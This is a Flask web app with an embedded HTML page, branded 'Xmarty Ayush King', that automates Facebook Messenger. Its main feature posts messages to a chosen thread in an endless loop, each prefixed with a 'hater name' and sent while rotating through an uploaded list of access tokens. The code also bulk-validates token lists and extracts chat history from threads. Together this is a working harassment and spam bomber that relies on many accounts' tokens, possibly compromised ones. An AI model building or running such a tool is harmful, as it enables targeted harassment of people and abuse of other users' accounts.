from flask import Flask, request, render_template, jsonify
import requests
import time
import threading
import os
import json
from datetime import datetime
import re

app = Flask(__name__)

# Global variables to control the sending process
sending_active = False
sending_thread = None
current_status = {
    'running': False,
    'messages_sent': 0,
    'failed_messages': 0,
    'current_message': '',
    'start_time': None
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def check_token_validity(access_token):
    """Check if a Facebook access token is valid"""
    try:
        url = f'https://graph.facebook.com/v15.0/me?access_token={access_token}'
        response = requests.get(url, timeout=10)
        if response.ok:
            data = response.json()
            return True, data.get('name', 'Unknown')
        return False, None
    except:
        return False, None

def extract_messages_from_chat(access_token, thread_id, limit=50):
    """Extract messages from a Facebook chat thread"""
    try:
        url = f'https://graph.facebook.com/v15.0/t_{thread_id}/messages'
        params = {
            'access_token': access_token,
            'limit': limit
        }
        response = requests.get(url, params=params, timeout=10)
        if response.ok:
            data = response.json()
            messages = []
            if 'data' in data:
                for msg in data['data']:
                    if 'message' in msg and msg['message']:
                        messages.append({
                            'message': msg['message'],
                            'created_time': msg.get('created_time', ''),
                            'from': msg.get('from', {}).get('name', 'Unknown')
                        })
            return True, messages
        return False, []
    except Exception as e:
        return False, []

def send_messages_loop(thread_id, haters_name, time_interval, access_tokens, messages, max_tokens, num_comments):
    """Main loop for sending messages"""
    global sending_active, current_status
    message_index = 0
    
    while sending_active:
        try:
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = messages[message_index % len(messages)].strip()
            
            full_message = f"{haters_name} {message}"
            parameters = {'access_token': access_token, 'message': full_message}
            post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            
            response = requests.post(post_url, json=parameters, headers=headers, timeout=10)
            
            current_status['current_message'] = full_message
            
            if response.ok:
                current_status['messages_sent'] += 1
                print(f"[+] SENT Successfully: {full_message}")
            else:
                current_status['failed_messages'] += 1
                print(f"[x] FAILED: {full_message}")
            
            message_index += 1
            time.sleep(time_interval)
            
        except Exception as e:
            print(f"Error in send loop: {e}")
            time.sleep(5)

def message_sender_task(thread_id, haters_name, time_interval, access_tokens, messages):
    """Task wrapper for message sending"""
    global sending_active, current_status
    num_comments = len(messages)
    max_tokens = len(access_tokens)
    
    current_status['running'] = True
    current_status['start_time'] = datetime.now()
    
    send_messages_loop(thread_id, haters_name, time_interval, access_tokens, messages, max_tokens, num_comments)
    
    current_status['running'] = False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_sending', methods=['POST'])
def start_sending():
    global sending_active, sending_thread, current_status
    
    if sending_active:
        return jsonify({'error': 'Already sending messages!'}), 400
    
    thread_id = request.form.get('threadId')
    haters_name = request.form.get('kidx')
    time_interval = int(request.form.get('time', 60))
    
    txt_file = request.files.get('txtFile')
    messages_file = request.files.get('messagesFile')
    
    if not txt_file or not messages_file:
        return jsonify({'error': 'Please upload both files!'}), 400
    
    access_tokens = txt_file.read().decode().splitlines()
    messages = messages_file.read().decode().splitlines()
    
    # Remove empty lines
    access_tokens = [t.strip() for t in access_tokens if t.strip()]
    messages = [m.strip() for m in messages if m.strip()]
    
    if not access_tokens or not messages:
        return jsonify({'error': 'Files are empty!'}), 400
    
    sending_active = True
    current_status = {
        'running': True,
        'messages_sent': 0,
        'failed_messages': 0,
        'current_message': '',
        'start_time': datetime.now(),
        'total_tokens': len(access_tokens),
        'total_messages': len(messages)
    }
    
    sending_thread = threading.Thread(
        target=message_sender_task,
        args=(thread_id, haters_name, time_interval, access_tokens, messages)
    )
    sending_thread.daemon = True
    sending_thread.start()
    
    return jsonify({'message': 'Sending started successfully!'})

@app.route('/stop_sending', methods=['POST'])
def stop_sending():
    global sending_active
    sending_active = False
    return jsonify({'message': 'Sending stopped!'})

@app.route('/status')
def status():
    global current_status
    if current_status['start_time']:
        elapsed = (datetime.now() - current_status['start_time']).total_seconds() if current_status['start_time'] else 0
        current_status['elapsed_time'] = elapsed
    return jsonify(current_status)

@app.route('/check_tokens', methods=['POST'])
def check_tokens():
    token_file = request.files.get('tokenFile')
    if not token_file:
        return jsonify({'error': 'Please upload token file!'}), 400
    
    tokens = token_file.read().decode().splitlines()
    tokens = [t.strip() for t in tokens if t.strip()]
    
    results = []
    valid_count = 0
    invalid_count = 0
    
    for i, token in enumerate(tokens):
        is_valid, name = check_token_validity(token)
        if is_valid:
            valid_count += 1
            results.append({'index': i+1, 'token': token[:20] + '...', 'status': 'Valid', 'name': name})
        else:
            invalid_count += 1
            results.append({'index': i+1, 'token': token[:20] + '...', 'status': 'Invalid', 'name': 'N/A'})
        time.sleep(0.5)  # Rate limiting
    
    return jsonify({
        'total': len(tokens),
        'valid': valid_count,
        'invalid': invalid_count,
        'results': results
    })

@app.route('/extract_chat', methods=['POST'])
def extract_chat():
    access_token = request.form.get('accessToken')
    thread_id = request.form.get('threadId')
    limit = int(request.form.get('limit', 50))
    
    if not access_token or not thread_id:
        return jsonify({'error': 'Please provide access token and thread ID!'}), 400
    
    success, messages = extract_messages_from_chat(access_token, thread_id, limit)
    
    if success:
        return jsonify({
            'success': True,
            'message_count': len(messages),
            'messages': messages
        })
    else:
        return jsonify({'success': False, 'error': 'Failed to extract messages!'}), 400

@app.route('/status_check', methods=['POST'])
def status_check():
    """Check if a Facebook page/thread is accessible"""
    thread_id = request.form.get('threadId')
    access_token = request.form.get('accessToken')
    
    if not thread_id:
        return jsonify({'error': 'Please provide thread ID!'}), 400
    
    try:
        url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
        params = {'access_token': access_token} if access_token else {}
        response = requests.get(url, params=params, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return jsonify({
                'status': 'Active',
                'thread_id': thread_id,
                'accessible': True,
                'details': data
            })
        elif response.status_code == 404:
            return jsonify({
                'status': 'Not Found',
                'thread_id': thread_id,
                'accessible': False
            })
        else:
            return jsonify({
                'status': f'Error {response.status_code}',
                'thread_id': thread_id,
                'accessible': False
            })
    except Exception as e:
        return jsonify({
            'status': 'Error',
            'thread_id': thread_id,
            'accessible': False,
            'error': str(e)
        }), 500

# Create templates directory
os.makedirs('templates', exist_ok=True)

# HTML Template
with open('templates/index.html', 'w') as f:
    f.write('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xmarty Ayush King - Facebook Automation Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #1a3c1a 0%, #4a3600 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            color: #ffd700;
            padding: 30px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .header h1 {
            font-size: 3em;
            margin-bottom: 10px;
        }
        
        .header p {
            font-size: 1.2em;
            color: #ffec8b;
        }
        
        .feature-menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .feature-card {
            background: rgba(0,0,0,0.7);
            border-radius: 15px;
            padding: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid #ffd700;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .feature-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(255,215,0,0.3);
        }
        
        .feature-card h3 {
            color: #ffd700;
            margin-bottom: 10px;
            font-size: 1.5em;
        }
        
        .feature-card p {
            color: #ccc;
            font-size: 0.9em;
        }
        
        .feature-card.active {
            border: 2px solid #ffd700;
            background: rgba(255,215,0,0.1);
            box-shadow: 0 0 20px rgba(255,215,0,0.5);
        }
        
        .panel {
            background: rgba(0,0,0,0.8);
            border-radius: 15px;
            padding: 30px;
            margin-top: 20px;
            border: 1px solid #ffd700;
            display: none;
        }
        
        .panel.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            color: #ffd700;
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        input, select, textarea {
            width: 100%;
            padding: 10px;
            background: rgba(255,255,255,0.1);
            border: 1px solid #ffd700;
            border-radius: 8px;
            color: white;
            font-size: 14px;
        }
        
        input[type="file"] {
            background: rgba(255,255,255,0.1);
            cursor: pointer;
        }
        
        button {
            background: linear-gradient(135deg, #ffd700, #ff9800);
            color: #1a3c1a;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: transform 0.2s;
        }
        
        button:hover {
            transform: scale(1.05);
        }
        
        button:active {
            transform: scale(0.95);
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #dc3545, #c82333);
            color: white;
        }
        
        .status-bar {
            margin-top: 20px;
            padding: 15px;
            background: rgba(0,0,0,0.5);
            border-radius: 10px;
            color: #ffd700;
            font-family: monospace;
        }
        
        .results {
            margin-top: 20px;
            padding: 15px;
            background: rgba(0,0,0,0.5);
            border-radius: 10px;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .result-item {
            padding: 10px;
            border-bottom: 1px solid #333;
            color: #ccc;
        }
        
        .result-item.valid {
            color: #4caf50;
        }
        
        .result-item.invalid {
            color: #f44336;
        }
        
        .stats {
            display: inline-block;
            margin: 10px;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border-radius: 8px;
        }
        
        @media (max-width: 768px) {
            .feature-menu {
                grid-template-columns: 1fr;
            }
            
            .panel {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 𝐗𝐌𝐀𝐑𝐓𝐘 𝐀𝐘𝐔𝐒𝐇 𝐊𝐈𝐍𝐆 🔥</h1>
            <p>Facebook Automation Tool - 24/7 Uptime</p>
        </div>
        
        <div class="feature-menu">
            <div class="feature-card" onclick="showFeature('sender')">
                <h3>📨 Message Sender</h3>
                <p>Send automated messages to Facebook threads continuously</p>
            </div>
            <div class="feature-card" onclick="showFeature('checker')">
                <h3>✓ Token Checker</h3>
                <p>Check validity of Facebook access tokens</p>
            </div>
            <div class="feature-card" onclick="showFeature('extractor')">
                <h3>💬 Chat Extractor</h3>
                <p>Extract messages from Facebook chat threads</p>
            </div>
            <div class="feature-card" onclick="showFeature('status')">
                <h3>📊 Status Check</h3>
                <p>Check Facebook thread/page status</p>
            </div>
        </div>
        
        <!-- Message Sender Panel -->
        <div id="sender" class="panel">
            <h2 style="color:#ffd700">📨 Automated Message Sender</h2>
            <form id="senderForm" enctype="multipart/form-data">
                <div class="form-group">
                    <label>Convo ID / Thread ID:</label>
                    <input type="text" name="threadId" required>
                </div>
                <div class="form-group">
                    <label>Hater Name (Prefix):</label>
                    <input type="text" name="kidx" required>
                </div>
                <div class="form-group">
                    <label>Speed (Seconds between messages):</label>
                    <input type="number" name="time" value="60" required>
                </div>
                <div class="form-group">
                    <label>Tokens File (.txt):</label>
                    <input type="file" name="txtFile" accept=".txt" required>
                </div>
                <div class="form-group">
                    <label>Messages File (.txt):</label>
                    <input type="file" name="messagesFile" accept=".txt" required>
                </div>
                <button type="submit">Start Sending</button>
                <button type="button" class="btn-stop" onclick="stopSending()" style="margin-left:10px">Stop Sending</button>
            </form>
            <div id="senderStatus" class="status-bar" style="display:none">
                <h3>📊 Live Status</h3>
                <div id="stats"></div>
            </div>
        </div>
        
        <!-- Token Checker Panel -->
        <div id="checker" class="panel">
            <h2 style="color:#ffd700">✓ Facebook Token Checker</h2>
            <form id="checkerForm" enctype="multipart/form-data">
                <div class="form-group">
                    <label>Tokens File (.txt):</label>
                    <input type="file" name="tokenFile" accept=".txt" required>
                </div>
                <button type="submit">Check Tokens</button>
            </form>
            <div id="checkerResults" class="results"></div>
        </div>
        
        <!-- Chat Extractor Panel -->
        <div id="extractor" class="panel">
            <h2 style="color:#ffd700">💬 Messenger Chat Extractor</h2>
            <form id="extractorForm">
                <div class="form-group">
                    <label>Access Token:</label>
                    <input type="text" name="accessToken" required>
                </div>
                <div class="form-group">
                    <label>Thread ID:</label>
                    <input type="text" name="threadId" required>
                </div>
                <div class="form-group">
                    <label>Message Limit:</label>
                    <input type="number" name="limit" value="50">
                </div>
                <button type="submit">Extract Messages</button>
            </form>
            <div id="extractorResults" class="results"></div>
        </div>
        
        <!-- Status Check Panel -->
        <div id="status" class="panel">
            <h2 style="color:#ffd700">📊 Thread Status Checker</h2>
            <form id="statusForm">
                <div class="form-group">
                    <label>Thread ID:</label>
                    <input type="text" name="threadId" required>
                </div>
                <div class="form-group">
                    <label>Access Token (Optional):</label>
                    <input type="text" name="accessToken">
                </div>
                <button type="submit">Check Status</button>
            </form>
            <div id="statusResults" class="results"></div>
        </div>
    </div>
    
    <script>
        let statusInterval = null;
        
        function showFeature(feature) {
            // Hide all panels
            document.querySelectorAll('.panel').forEach(panel => {
                panel.classList.remove('active');
            });
            
            // Remove active class from all cards
            document.querySelectorAll('.feature-card').forEach(card => {
                card.classList.remove('active');
            });
            
            // Show selected panel
            document.getElementById(feature).classList.add('active');
            
            // Add active class to clicked card
            event.currentTarget.classList.add('active');
        }
        
        // Message Sender
        document.getElementById('senderForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            const response = await fetch('/start_sending', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            if (result.message) {
                alert(result.message);
                document.getElementById('senderStatus').style.display = 'block';
                startStatusUpdate();
            } else {
                alert('Error: ' + (result.error || 'Unknown error'));
            }
        });
        
        async function stopSending() {
            const response = await fetch('/stop_sending', { method: 'POST' });
            const result = await response.json();
            alert(result.message);
            if (statusInterval) {
                clearInterval(statusInterval);
                statusInterval = null;
            }
            document.getElementById('senderStatus').style.display = 'none';
        }
        
        function startStatusUpdate() {
            if (statusInterval) clearInterval(statusInterval);
            statusInterval = setInterval(async () => {
                const response = await fetch('/status');
                const status = await response.json();
                
                document.getElementById('stats').innerHTML = `
                    <div class="stats">Status: ${status.running ? '🟢 Running' : '🔴 Stopped'}</div>
                    <div class="stats">Messages Sent: ✅ ${status.messages_sent || 0}</div>
                    <div class="stats">Failed: ❌ ${status.failed_messages || 0}</div>
                    <div class="stats">Current: 💬 ${status.current_message || 'None'}</div>
                    <div class="stats">Tokens: ${status.total_tokens || 0}</div>
                    <div class="stats">Messages in Queue: ${status.total_messages || 0}</div>
                `;
            }, 2000);
        }
        
        // Token Checker
        document.getElementById('checkerForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            const response = await fetch('/check_tokens', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            const resultsDiv = document.getElementById('checkerResults');
            
            if (result.results) {
                resultsDiv.innerHTML = `
                    <h3>Results:</h3>
                    <div class="stats">Total: ${result.total}</div>
                    <div class="stats">Valid: ${result.valid}</div>
                    <div class="stats">Invalid: ${result.invalid}</div>
                    <hr>
                    ${result.results.map(r => `
                        <div class="result-item ${r.status.toLowerCase()}">
                            <strong>Token ${r.index}:</strong> ${r.status}<br>
                            ${r.name !== 'N/A' ? `Name: ${r.name}<br>` : ''}
                            Token: ${r.token}
                        </div>
                    `).join('')}
                `;
            }
        });
        
        // Chat Extractor
        document.getElementById('extractorForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            const response = await fetch('/extract_chat', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            const resultsDiv = document.getElementById('extractorResults');
            
            if (result.success) {
                resultsDiv.innerHTML = `
                    <h3>Extracted Messages (${result.message_count}):</h3>
                    ${result.messages.map(msg => `
                        <div class="result-item">
                            <strong>${msg.from || 'Unknown'}</strong> (${msg.created_time}):<br>
                            ${msg.message}
                        </div>
                    `).join('')}
                `;
            } else {
                resultsDiv.innerHTML = `<div class="result-item invalid">Error: ${result.error}</div>`;
            }
        });
        
        // Status Check
        document.getElementById('statusForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            const response = await fetch('/status_check', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            const resultsDiv = document.getElementById('statusResults');
            
            if (result.status) {
                resultsDiv.innerHTML = `
                    <div class="result-item ${result.accessible ? 'valid' : 'invalid'}">
                        <strong>Status:</strong> ${result.status}<br>
                        <strong>Thread ID:</strong> ${result.thread_id}<br>
                        <strong>Accessible:</strong> ${result.accessible ? '✅ Yes' : '❌ No'}<br>
                        ${result.details ? `<strong>Details:</strong><pre>${JSON.stringify(result.details, null, 2)}</pre>` : ''}
                    </div>
                `;
            }
        });
        
        // Show default feature
        showFeature('sender');
    </script>
</body>
</html>
    ''')

if __name__ == '__main__':
    # Run with production server for better uptime
    app.run(host='0.0.0.0', port=5000, threaded=True)
